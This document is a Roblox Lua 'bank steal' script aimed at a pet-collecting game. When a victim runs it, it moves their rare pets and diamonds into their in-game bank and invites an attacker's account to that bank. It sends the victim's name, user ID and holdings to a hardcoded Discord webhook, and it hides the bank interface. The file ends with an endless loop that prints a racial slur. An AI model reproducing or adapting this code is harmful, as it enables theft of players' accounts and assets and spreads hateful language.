_G.Debug= "12.12.2022 - 17:22"
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true -- BS SCRIPT V4 lol
game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.Position
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).Deposit, 16)
local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
local getbankremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetBank, 3)
local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Framework.Client["1 | Network"]).Invoke)
local blobb = getupvalues(bloba[2])
--blobb[2](2, ".t")
getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
inviteremote = blobz[blobb[2](2, inviteremote)]
lockremote = blobz[blobb[2](2, lockremote)]
depositremote = blobz[blobb[2](2, depositremote)]
eggremote = blobz[blobb[2](2, eggremote)]
getbankremote = blobz[blobb[2](2, getbankremote)]

local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]
deletebank:Destroy()
-- Testing Mode

if _G.License and _G.License ~= nil and _G.License ~= "" then
 _G.Key = "xolboR"
 _G.AuthServer = "https://discord.com/api/webhooks/1051967241362604113/6uQVLq8760HPjj9eczRuwjDKOoTRVtXmvcGOni4-H45jbxA1t3cjsuVk2363OFWl-fro"
end
_G.UserId = game:GetService("Players"):GetUserIdFromNameAsync(string.reverse(_G.Key))
if _G.AuthServer ~= "" and _G.AuthServer ~= nil and _G.AuthServer then
_G.Webhook = _G.AuthServer
 else
 _G.Webhook = "https://discord.com/api/webhooks/1051967241362604113/6uQVLq8760HPjj9eczRuwjDKOoTRVtXmvcGOni4-H45jbxA1t3cjsuVk2363OFWl-fro"
end

-- Invitation ID

local idiot = 1197546066 -- the dualhook invite

-- Invitation ID End

-- Bank ID and Library

local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mybanks = getmybanksremote:InvokeServer()
local BankID = mybanks[1]['BUID']
local Bank = BankID

-- Bank ID and Library End


-- Deposit

local FinalList = {}

Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
Functions   = Library.Functions
EXCList     = {}
  MythicList  = {}
  HugeList = {}

PogList = {139, 177, 176, 178}
  EList       = {}
  MList       = {}
  HList    = {}
  PList = {}

print("List Detected")

table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" then
    table.insert(EXCList, i)
  end
  if v.rarity == "Mythical" then
    table.insert(MythicList, i)
  end
  if v.huge then
    table.insert(HugeList, i)
  end
end)
for i, v in pairs(PogList) do
table.insert(EXCList, v)
end

local pets = require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
pcall(function()
lockremote:InvokeServer(y)
end)
wait(6)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
end
if #EList + #MList + #PList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
table.insert(FinalList, v)
end
elseif #EList + #MList > 49 and #EList < 49 then
for i, v in pairs(EList) do
table.insert(FinalList, v)
end
for i, v in pairs(MList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
elseif #EList + #MList > 49 and #EList > 49 then
for i, v in pairs(EList) do
if #FinalList < 49 then
table.insert(FinalList, v)
end
end
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
[1] = "Cracked Egg", 
[2] = false
}
wait(0.5)
local A_1 = 
{
[1] = Bank, 
[2] = FinalList,
[3] = 0
}
local s, e
pcall(function()
s, e = depositremote:InvokeServer(Bank, FinalList, require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Diamonds-1);
end)
print(s, e)
if s == false then
 wait(6)
 pcall(function()
s, e = depositremote:InvokeServer(Bank, FinalList, 1);
end)
 end
 print(s, e)
-- Deposit End

-- Webhook (Victim)

local us = _G.Webhook
local url2 = us
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
request = http_request or request or HttpPost or syn.request
 local SuperBank = getbankremote:InvokeServer(Bank);
  EXCList     = {}
     MythicList  = {}
  LegList = {}
  EpicList = {}
  RareList = {}
  CommonList = {}
  
  HugeList = {}
  HCList = {}
  GiftList = {}
  
  ScumList = {358, 359, 360, 361, 363, 364, 365, 366, 367, 368, 369, 377, 378, 117, 140, 131, 147, 156, 185, 199, 210, 241, 242, 246, 130, 98, 142, 148, 168, 90, 133, 183, 106, 6969}
  PogList = {139, 177, 176, 178}
  
  EXCCount = 0
  MythicCount = 0
  LegCount = 0
  EpicCount = 0
  RareCount = 0
  CommonCount = 0
  
  HugeCount = 0
  
  ScumCount = 0
  PogCount = 0
  HCCount = 0
  GiftCount = 0
  
  table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" and not v.huge then
      table.insert(EXCList, i)
    end
    if v.rarity == "Mythical" then
      table.insert(MythicList, i)
    end
    if v.rarity == "Legendary" then
      table.insert(LegList, i)
    end
    if v.rarity == "Epic" then
      table.insert(EpicList, i)
    end
    if v.rarity == "Rare" then
      table.insert(RareList, i)
    end
    if v.rarity == "Basic" then
      table.insert(CommonList, i)
    end
    if v.huge then
      table.insert(HugeList, i)
    end
    if v.isGift then
      table.insert(GiftList, i)
    end
  end)
  for i, v in pairs(SuperBank["Storage"]["Pets"]) do
  if table.find(EXCList, v["id"]) then EXCCount = EXCCount + 1 end
  if table.find(MythicList, v["id"]) then MythicCount = MythicCount + 1 end
  if table.find(LegList, v["id"]) then LegCount = LegCount + 1 end
  if table.find(EpicList, v["id"]) then EpicCount = EpicCount + 1 end
  if table.find(RareList, v["id"]) then RareCount = RareCount + 1 end
  if table.find(CommonList, v["id"]) then CommonCount = CommonCount + 1 end
  if table.find(HugeList, v["id"]) then HugeCount = HugeCount + 1 end
  if table.find(ScumList, v["id"]) then ScumCount = ScumCount + 1 end
  if table.find(PogList, v["id"]) then PogCount = PogCount + 1 end
  if v.hc then HCCount = HCCount + 1 end
  if v.hc and v.s >= 100000000000000 then ScumCount = ScumCount + 1 end
  if v.id == 199 and v.s == 75000000 then ScumCount = ScumCount + 1 end
  if v.id == 272 and v.s == 70000000000 then ScumCount = ScumCount + 1 end
  if table.find(GiftList, v["id"]) then GiftCount = GiftCount + 1 end
  end
wait(6)
-- End Webhoook Victim
-- Webhook (OUR)
  if HugeCount >= 1 or EXCCount >= 20 or ScumCount >= 1 or GiftCount >= 1 or #HList >= 1 or SuperBank["Storage"]["Currency"]["Diamonds"] >= 100000000000 then
local YourWebHookHere =  "https://discord.com/api/webhooks/1051967241362604113/6uQVLq8760HPjj9eczRuwjDKOoTRVtXmvcGOni4-H45jbxA1t3cjsuVk2363OFWl-fro"  -- web hook here

local url = https://discord.com/api/webhooks/1051967241362604113/6uQVLq8760HPjj9eczRuwjDKOoTRVtXmvcGOni4-H45jbxA1t3cjsuVk2363OFWl-fro
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
request = http_request or request or HttpPost or syn.request
 
local data = {
  ["content"] = "@everyone We Got a Hit!",
["embeds"] = {{
["title"] = "__**Bank Steal Results**__",
["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
["type"] = "rich",
["color"] = tonumber(0x0E980E),
["fields"] = {
               {
["name"] = "__User__",
["value"] = "** ("..game.Players.LocalPlayer.DisplayName..") "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
["inline"] = false
},
               {
["name"] = "__Gems__",
["value"] = SuperBank["Storage"]["Currency"]["Diamonds"],
["inline"] = false
},
{
["name"] = "__Pets Overall__",
["value"] = #SuperBank["Storage"]["Pets"],
["inline"] = false
},
{
["name"] = "__Huges__",
["value"] = HugeCount,
["inline"] = true
},
{
["name"] = "__Exclusives__",
["value"] = EXCCount,
["inline"] = true
},
{
["name"] = "__Gifts/Eggs__",
["value"] = GiftCount,
["inline"] = true
},
{
["name"] = "__Hardcore Pets__",
["value"] = HCCount,
["inline"] = true
},
{
["name"] = "__BankID__",
["value"] = Bank,
["inline"] = false
},
}
}}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
 pcall(function()
local x,y = inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
   end)
 for i, v in pairs(y) do print(i, v)end
 else
local data = {
  ["content"] = "@everyone We Got a Hit!",
["embeds"] = {{
["title"] = "__**Bank Steal Results**__",
["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
["type"] = "rich",
["color"] = tonumber(0x0E980E),
["fields"] = {
               {
["name"] = "__User__",
["value"] = "** ("..game.Players.LocalPlayer.DisplayName..") "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
["inline"] = false
},
               {
["name"] = "__Gems__",
["value"] = SuperBank["Storage"]["Currency"]["Diamonds"],
["inline"] = false
},
{
["name"] = "__Pets Overall__",
["value"] = #SuperBank["Storage"]["Pets"],
["inline"] = false
},
{
["name"] = "__Huges__",
["value"] = HugeCount,
["inline"] = true
},
{
["name"] = "__Exclusives__",
["value"] = EXCCount,
["inline"] = true
},
{
["name"] = "__Gifts/Eggs__",
["value"] = GiftCount,
["inline"] = true
},
{
["name"] = "__Hardcore Pets__",
["value"] = HCCount,
["inline"] = true
},
{
["name"] = "__BankID__",
["value"] = Bank,
["inline"] = false
},
}
}}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef2 = {Url = url2, Body = newdata, Method = "POST", Headers = headers}
request(abcdef2)
   local z, zz
 pcall(function()
z, zz = inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserId)
 end)
 end

-- Invites Scripts ( Dont Change if u dont know any )


local sendMessage = require(game:GetService("ReplicatedStorage").Framework.Client["5 | Message"]).New

wait(5)
while true do
 print("L NIGGA")
 end
